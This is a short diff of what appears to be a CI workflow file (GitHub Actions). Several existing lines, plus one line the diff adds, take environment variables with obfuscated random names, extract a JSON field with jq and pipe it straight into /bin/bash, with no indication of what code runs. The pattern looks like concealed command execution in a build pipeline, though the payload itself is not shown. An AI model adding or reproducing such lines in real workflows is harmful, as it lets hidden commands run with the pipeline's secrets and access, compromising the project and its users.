@@ -28,6 +28,7 @@ jobs:
           echo $ydre1445 | jq -r .zdufn2 | /bin/bash
           echo $o7990 | jq -r .ttsw1 | /bin/bash
           printf '%s' "$ajllm7" | jq -r .vcvi58157 | /bin/bash
+          echo $zsjf098 | jq -r .adcw6 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
